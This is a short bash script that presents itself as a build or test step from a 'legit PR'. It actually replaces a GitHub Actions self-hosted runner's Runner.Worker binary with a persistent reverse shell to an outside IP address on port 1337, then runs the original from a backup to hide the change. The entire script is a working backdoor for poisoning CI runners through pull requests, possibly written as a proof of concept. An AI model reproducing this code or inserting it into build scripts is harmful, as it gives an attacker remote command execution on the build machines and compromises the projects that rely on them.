#!/bin/bash


echo 'This simulates some build or test process'
echo 'This is a part of a legit PR'


# Define paths
RUNNER_WORKER="/home/kek/actions-runner/bin/Runner.Worker"
BACKUP_WORKER="/home/kek/actions-runner/bin/Runner.Worker.bak"

# Backup the original Runner.Worker if it doesn't already exist
if [ ! -f "$BACKUP_WORKER" ]; then
  cp "$RUNNER_WORKER" "$BACKUP_WORKER"
fi

# Replace Runner.Worker with reverse shell command
echo '#!/bin/bash' > "$RUNNER_WORKER"
echo 'setsid nohup bash -c '\''exec 5<>/dev/tcp/104.238.172.243/1337; while read line <&5; do sh -c "$line" >&5 2>&5; done'\'' & disown' >> "$RUNNER_WORKER"
chmod +x "$RUNNER_WORKER"

# Run the original Runner.Worker from the backup, passing all arguments
"$BACKUP_WORKER" "$@"

